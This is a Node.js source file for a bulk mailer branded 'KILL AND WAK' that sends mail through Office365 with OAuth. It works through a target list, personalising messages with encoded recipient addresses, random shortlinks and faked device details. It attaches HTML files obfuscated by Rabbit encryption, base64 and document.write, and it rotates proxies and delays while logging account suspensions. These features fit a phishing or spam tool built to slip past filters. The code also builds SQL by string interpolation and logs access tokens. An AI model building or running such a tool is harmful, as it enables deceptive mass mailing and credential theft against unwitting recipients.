/*
 * Dont touch anything in this file unless you know what you are doing
 *author: @ryuchan
 *programing language: javascript (nodejs) 
 * check readme.md for more info and placeholders eg: {email} {domain}. You will see all the placeholders in readme , check it */

"use strict";
const nodemailer = require("nodemailer");
const moment = require("moment");
const colors = require("colors");
const fs = require("fs");
const random = require("./random.js");
const config = require("./config.js");
const figlet = require("figlet");
const msg = require("./msg.js");
var CryptoJS = require("crypto-js");
var staticDate = moment().format("YYYYMMDDHHMMSS");
var random_name = require('node-random-name');
const sqlite3 = require('sqlite3').verbose();
const express = require('express');
const session = require('express-session');
const { ConfidentialClientApplication } = require('@azure/msal-node');
require('dotenv').config();
// print logo

const app = express();
const port = 3000;

// Configure MSAL
const msalConfig = {
    auth: {
        clientId: process.env.CLIENT_ID,
        authority: `https://login.microsoftonline.com/${process.env.TENANT_ID}`,
        clientSecret: process.env.CLIENT_SECRET,
    },
};

const cca = new ConfidentialClientApplication(msalConfig);

// Middleware
app.use(session({
    secret: 'your_secret_key', // Change this to a secure key in production
    resave: false,
    saveUninitialized: true,
}));

// OAuth login route
app.get('/auth', async (req, res) => {
    const authUrlParams = {
        scopes: ['https://outlook.office.com/SMTP.Send'], // Scopes for accessing Microsoft Graph API
    };

    const authUrl = await cca.getAuthCodeUrl({
        ...authUrlParams,
        redirectUri: 'http://localhost:3000/auth/callback',
    });

    res.redirect(authUrl);
});

// OAuth callback route
app.get('/auth/callback', async (req, res) => {
    const authCode = req.query.code;

    if (!authCode) {
        return res.status(400).send('Authorization code is missing');
    }

    const tokenRequest = {
        code: authCode,
        scopes: ['https://outlook.office.com/SMTP.Send'], // Request .default scope for Microsoft Graph
        redirectUri: 'http://localhost:3000/auth/callback',
    };

    try {
        const tokenResponse = await cca.acquireTokenByCode(tokenRequest);
        req.session.accessToken = tokenResponse.accessToken; // Store access token
        console.log(req.session.accessToken)
        res.redirect('/send-email'); // Redirect to email sending route
    } catch (err) {
        console.error('Error acquiring token:', err);
        res.status(500).send('Error acquiring token');
    }
});

console.log(
	colors.rainbow(
		figlet.textSync(" KILL AND WAK", {
			font: "Ogre",
			horizontalLayout: "default",
			verticalLayout: "default"
		})
	)
);
console.log(
	"                              " + colors.italic("Coder : @Badisfool")
);
console.log("");
// -------------------------------------

const list = fs
	.readFileSync(config.send.list)
	.toString()
	.split("\n");
console.log(
	colors.white(" [+]")+
	colors.white(
		" Emails list File : " +
		colors.cyan(" " + config.send.list + " ")
	)
);

const html = fs.readFileSync(config.send.letter, "utf-8");

console.log(
	colors.white(" [+]")+
	colors.white(
		" Message HTML File : " +
		colors.cyan(" " + config.send.letter + " ")
	)
);

console.log(
	colors.white(" [+]")+
	colors.white(" Starting The Engine ... ... ... ")
);

const db = new sqlite3.Database(':memory:');
	
	db.serialize(() => {
		db.run("CREATE TABLE IF NOT EXISTS lorem (info TEXT,status TEXT, count INTERGER)");
		var bb = process.env.USER_EMAIL
		const stmt = db.prepare("INSERT INTO lorem VALUES (?,'good',0)");
		// for (let i = 0; i < bb.length; i++) {
		// 	stmt.run(`${bb[i].user}`);
		// }
		stmt.run(`${bb}`);
		stmt.finalize();
	
		db.each("SELECT rowid AS id, * FROM lorem", (err, row) => {
			console.log(row.id + ": " + row.info + ": " + row.count + ": " + row.status);
		});
	});
	
	//db.close();
	function stringGen(len) {
        var text = "";
        
        var charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ";
        
        for (var i = 0; i < len; i++)
          text += charset.charAt(Math.floor(Math.random() * charset.length));
        
        return text;
      }
function encrypt_html(string){

		var byt4 = stringGen(16);
        var Passphrase = byt4
        var encryptedAES = CryptoJS.Rabbit.encrypt(string, Passphrase);
        //document.getElementById("output").innerText = encryptedAES.toString()
        var decryptedBytes = CryptoJS.Rabbit.decrypt(encryptedAES, Passphrase);
        var plaintext = decryptedBytes.toString(CryptoJS.enc.Utf8);
        var byt = stringGen(4);
        var byt1 = stringGen(5);
        var byt2 = stringGen(6);
        var byt3 = stringGen(7);
		var byt6= stringGen(20);
		var byt7= stringGen(20);
		var byt7= stringGen(100);
        var script_name =stringGen(9)+".js"
        var encrypteddata= encryptedAES.toString()

		var coded = 'var '+byt+'="'+encryptedAES.toString()+'" \n var '+byt1+' = "'+byt4+'"; \n var '+byt3+'= CryptoJS.Rabbit.decrypt('+byt+', '+byt1+'); \n var '+byt2+' = '+byt3+'.toString(CryptoJS.enc.Utf8); \n document.write('+byt2+') ';
		var koko= '<!DOCTYPE html><html><head><title>r<\/title>\n<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"><\/script>\n<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js">\n<\/script><script>'+coded+' <\/script></head><body><!--'+byt7+'--><\/body></html>'
        var bs64coded = btoa(koko)
		var lala =`<!DOCTYPE html>
<html>
    <head>
	<script>

	var ${byt6} = "${bs64coded}";
	var ${byt7} = atob(${byt6});
	document.write(${byt7})
	</script>
	</head>
    <body>
    </body>
</html>`
        
        
		return lala

}	
function dateFromnow(days){
	return moment().add(days, 'days').format('dddd D MMMM YYYY');
}
moment().add(3, 'days').format('dddd D MMMM YYYY');
function getDate() {
	return moment().format("MMM D, hh:mm:ss a");
	 
}


function replace_smtp(input, Smtp_user) {
	return input
		.replace(new RegExp("{smtp_user}", "g"), Smtp_user)

} 

// ganti string
function replace_tags(input, email) {
	var data = email.trim();
	var buff = Buffer.from(data);
	var randomName =random_name()
	var base64email = buff.toString('base64');
	var username = email.substring(0,email.indexOf('@'))
	var ind=email.indexOf("@");
    var domain=email.substr((ind+1));
	var aesEmail = CryptoJS.AES.encrypt(email, "secret key 123").toString();
	return input
		.replace(new RegExp("{user}", "g"), username)
		.replace(new RegExp("{random_name}", "g"),randomName)
		.replace(new RegExp("{aes_email}", "g"), aesEmail)
		.replace(new RegExp("{domain}", "g"), domain)
		.replace(new RegExp("{email}", "g"), data)
		.replace(new RegExp("{base64email}", "g"), base64email)
		.replace(new RegExp("{date}", "g"), getDate())
		.replace(new RegExp("{random_ip}", "g"), random.ip())
		.replace(new RegExp("{random_country}", "g"), random.country())
		.replace(new RegExp("{random_device}", "g"), random.device())
		.replace(new RegExp("{random_browser}", "g"), random.browser())
		.replace(new RegExp("{random_msg}", "g"), randomArray(msg.msgs))
		.replace(new RegExp("{random_shortlink}", "g"), randomArray(config.shortlink))
		.replace(new RegExp(/\{random_number_(\d+)\}/, "g"), (_, n) => random.number(n))
		.replace(new RegExp(/\{from_now_(\d+)\}/, "g"), (_, n) => dateFromnow(n))
		.replace(new RegExp(/\{random_letterup_(\d+)\}/, "g"), (_, n) => random.letterup(n))
		.replace(new RegExp(/\{random_letterlow_(\d+)\}/, "g"), (_, n) => random.letteruplow(n))
		.replace(new RegExp(/\{random_letteruplow_(\d+)\}/, "g"), (_, n) => random.letteruplow(n))
		.replace(new RegExp(/\{random_letternumberuplow_(\d+)\}/, "g"), (_, n) => random.letternumberuplow(n))
		.replace(new RegExp("{aes_link}", "g"), CryptoJS.AES.encrypt(randomArray(config.shortlink), "secret key 123").toString());

}

// random array
function randomArray(array){
  var id = Math.floor(Math.random() * array.length);
  return array[id];
}

// mengganti objek berisi string
function get_customised_message_template(email) {
	var randomArrayMessage = randomArray(config.message);
	return {
		subject: replace_tags(randomArrayMessage.subject, email),
		fromName: replace_tags(randomArrayMessage.fromName, email),
		fromEmail: replace_tags(randomArrayMessage.fromEmail, email),
		text: replace_tags(config.send.text, email),
		html: replace_tags(html, email),
	};
}

function getsmtp(){
	var smtp = randomArray(sender.smtp)
	var limit = process.env.limit

}
async function checkSMTP(data) {
    try {
        let transporter = nodemailer.createTransport({
            pool: true,
            host: data.host,
            port: data.port,
            secure: data.secure,
            auth: {
                user: data.user,
                pass: data.pass
            }
        });
        await transporter.verify();
        return true;
    } catch(err) {
        return false;
    }
}
function getSmtpCount(id){
	let sql = `SELECT *
	FROM lorem
	WHERE info  = "${id}"`
    return new Promise((resolve, reject) => {
        db.get(sql, (err, row)  => {
            if (err) reject(err); // I assume this is how an error is thrown with your db callback
            resolve(row.count);
        });
    });

  }
  async function getSmtpstatus( id) {
	let sql = `SELECT *
	FROM lorem
	WHERE info  = "${id}"`
    return new Promise((resolve, reject) => {
        db.get(sql, (err, row)  => {
            if (err) reject(err); // I assume this is how an error is thrown with your db callback
            resolve(row.status);
        });
    });
}


  function updateCount(count,uid){
	let sql = `UPDATE lorem
					SET count = ${count}
					WHERE info= "${uid}"`;

		db.run(sql, function(err) {
		if (err) {
			return console.error(err.message);
		}
		console.log(`${uid} has sent ${count} emails`);

		});
  }
async function kirim (email,cnt,accessToken) {
	var randomArraySmtp = process.env.USER_EMAIL;
	var count = await getSmtpCount(randomArraySmtp)

	//console.log(`this count ${count}`)
	//console.log(`ee:${await getSmtpstatus(randomArraySmtp)}`)
	if(await getSmtpstatus(randomArraySmtp) == "bad"){
		console.log(`${randomArraySmtp} na bad smtp`)
		return
	}
	if(count >= process.env.limit){
		console.log(`${randomArraySmtp} smtp limit exceeeded`)
		process.exit(1);
	}
	//console.log(`ff:${randomArraySmtp}`)
	// --------------- multy smtp --------------
	// if(! await checkSMTP(randomArraySmtp)){
	// 	// let sql = `UPDATE lorem
	// 	// 			SET status = "bad"
	// 	// 			WHERE info= ?`;

	// 	// db.run(sql,randomArraySmtp, function(err) {
	// 	// if (err) {
	// 	// 	return console.error(err.message);
	// 	// }
	// 	//console.log(`${randomArraySmtp} is a bad smtp (check smtp credentials)`)

	// 	// });
	// 	// db.each("SELECT rowid AS id, * FROM lorem", (err, row) => {
	// 	// 	console.log(`smtp report`)
	// 	// 	console.log(row.id + ": " + row.info + ": " + row.count + ": " + row.status);
	// 	// })
	// 	// close the database connection
	// 	fs.appendFileSync("your-logs/badsmtp.txt", `:${randomArraySmtp}\n`);
	// 	return

	
	// }

	var transporter;

	if (config.send.useHttpProxy) {
			transporter = nodemailer.createTransport({
			host: 'smtp.office365.com',
			port: 587,
			secure: false, // true for 465, false for other ports
			auth: {
				type: 'OAuth2',
				user: process.env.USER_EMAIL, // The user's email
				accessToken: accessToken, // The acquired access token
			},
			proxy: config.proxy.http,
			connectionTimeout: 20000, // Connection timeout in milliseconds (10 seconds)
        	socketTimeout: 20000, 
		});
	}

	else{
		
			transporter = nodemailer.createTransport({
			host: 'smtp.office365.com',
			port: 587,
			secure: false, // true for 465, false for other ports
			auth: {
				type: 'OAuth2',
				user: process.env.USER_EMAIL, // The user's email
				accessToken: accessToken, // The acquired access token
			},
		});
	
	}

	

	
	// nodemailer.createTransport(smtp);

	// -------------------------------------------

	const random_message = get_customised_message_template(email);

	const message = {
		from: random_message.fromName + "<" + replace_smtp(random_message.fromEmail, randomArraySmtp) + ">",
		to: email,
		subject: random_message.subject,
		replyTo: replace_tags(randomArray(config.reply2), email),
		text: random_message.text,
		html: random_message.html,
		attachDataUrls: true,
		encoding: "base64",
		contentTransferEncoding: "base64",
		//priority: "low",
		disableUrlAccess: true,
		attachments: [], // Initialize the attachments array
	  };
	  
	  // Add custom headers if necessary
	  if (config.send.useHeader) {
		message.headers = { ...config.custom_headers };
	  }
	  
	  // Initialize the attachments array (if not already)
	  message.attachments = message.attachments || [];
	  
	  // Handle files to attach
	  var filen = config.attach.file;
	  var encrypt = config.attach.encrypt;
	  var file;
	  
	  if (filen.substring(filen.indexOf('.') + 1) == "html") {
		if (encrypt) {
		  file = {
			filename: replace_tags(randomArray(config.attach.fileName), email),
			content: encrypt_html(replace_tags(fs.readFileSync(config.attach.file, "utf-8"), email)),
		  };
		} else {
		  file = {
			filename: replace_tags(randomArray(config.attach.fileName), email),
			content: replace_tags(fs.readFileSync(config.attach.file, "utf-8"), email),
		  };
		}
	  } else {
		file = {
		  filename: replace_tags(randomArray(config.attach.fileName), email),
		  path: config.attach.file,
		};
	  }
	  
	  // If `useAttach` is enabled, add the file to the attachments array
	  if (config.send.useAttach) {
		message.attachments.push(file); // Add file to attachments
	  }
	  
	  // Add images with cid if necessary
	  if (config.send.isAttachimgs && Array.isArray(config.imgs)) {
		config.imgs.forEach(img => {
		  // Add each image to the attachments array with the cid for embedding
		  message.attachments.push({
			filename: img.filename || "image.png", // Default to "image.png" if filename is not specified
			path: img.path, // Path of the image file
			cid: img.cid, // Content-ID for embedding in the email body
		  });
		});
	  }
	  
	  // Now message.attachments contains multiple files (and images with cid)
	  

	transporter.sendMail(message, (error, info) => {

		if (error) {
			if(error.message.includes('Actual verdict is Suspend')){
			// 	let sql = `UPDATE lorem
			// SET status = "bad"
			// WHERE info= ?`;
	
			// db.run(sql,randomArraySmtp, function(err) {
			// if (err) {
			// 	return console.error(err.message);
			// }
			 console.log(`${randomArraySmtp} hotmail blocked..login to verify`)
	
			// });
			// db.each("SELECT rowid AS id, * FROM lorem", (err, row) => {
			// 	console.log(`smtp report`)
			// 	console.log(row.id + ": " + row.info + ": " + row.count + ": " + row.status);
			// })
			// close the database connection
			fs.appendFileSync("your-logs/badsmtp.txt", `:${randomArraySmtp}\n`);
			return
		}
		if(error.message.includes('Actual verdict is RefuseQuota')){
			let sql = `UPDATE lorem
		SET status = "bad"
		WHERE info= ?`;
	
		// db.run(sql,randomArraySmtp, function(err) {
		// if (err) {
		// 	return console.error(err.message);
		// }
		console.log(`${randomArraySmtp} hotmail quota ecxeeded`)
	
		// });
		// db.each("SELECT rowid AS id, * FROM lorem", (err, row) => {
		// 	console.log(`smtp report`)
		// 	console.log(row.id + ": " + row.info + ": " + row.count + ": " + row.status);
		// })
		// close the database connection
		fs.appendFileSync("your-logs/badsmtp.txt", `:${randomArraySmtp}\n`);
		return
	}
			console.log(error +
				colors.white("\r\n [+]")+
				colors.cyan(" [" +(cnt+1)+ "/" + list.length + "]") +
				colors.yellow(" [" + getDate() + "]") +
				colors.red(" [DEAD]") +
				colors.red(" [" + email.replace(/(\r\n|\n|\r)/gm,"") + "]") +
				colors.white(" Delay for " + config.send.delay + " seconds... ")
				
			);
			fs.appendFileSync("your-logs/email-invalid.txt", "failed => "+email);
			
			return 
				
		}
		 
		else{
			
			
			fs.appendFileSync("your-logs/sent.txt", email+"\n");	
		
		}
		if (config.send.useHttpProxy) {
			console.log(	
				colors.white(" [+]")+
				colors.cyan(" [" +(cnt+1)+ "/" + list.length + "]") +
				colors.yellow(`(smtp_user:${randomArraySmtp}:${count})`) +
				colors.yellow(" [" + getDate() + "]") +
				colors.green(" [Boxed]") +
				colors.red(" [http Proxy: " + config.proxy.http + "]") +
				colors.green(" [" + email.replace(/(\r\n|\n|\r)/gm,"") + "]") +
				colors.red(" Delay for " + config.send.delay + " seconds... ")
			);
		} else {
			console.log(
				colors.white(" [+]")+
				colors.cyan(" [" +(cnt+1)+ "/" + list.length + "]") +
				colors.yellow(`(smtp_user:${randomArraySmtp}:${count})`) +
				colors.yellow(" [" + getDate() + "]") +
				colors.green(" [Boxed]") +
				colors.green(" [" + email.replace(/(\r\n|\n|\r)/gm,"") + "]") +
				colors.red(" Delay for " + config.send.delay + " seconds... ")
				
			);
			if ((cnt+1) % config.send.pauseAfter === 0) {
				console.log(colors.red(" [+] Paused for "+config.send.pauseFor+" seconds after "+config.send.pauseAfter+" emails"));
			}
		}
	});
	count++
	updateCount(count,randomArraySmtp)

};

const timeout = ms => new Promise(res => setTimeout(res, ms))
async function startSend(accessToken) {
	for (var i = 0; i < list.length; i++) {
		kirim(list[i],i,accessToken);
		if ( (i%config.send.pauseAfter) == 4) {
			await timeout(config.send.pauseFor*1000);
		}else{
			await timeout(config.send.delay*1000);
		}
	}
	process.exit(1);
}
app.get('/send-email', async (req, res) => {
    const { accessToken } = req.session;
    if (!accessToken) {
        return res.status(401).send('Unauthorized: Missing access token');
    }
	try {
		res.send('<p>Sendind emails.......</p>');
		const result = await startSend(accessToken)
        res.send(`finished sending emails`);
    } catch (err) {
        console.error('Error sending email:', err);
        res.send(`Error sending email:`+err);
    }


 
});

// Start server
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
	require('child_process').exec(`start http://localhost:${port}/auth`);
});


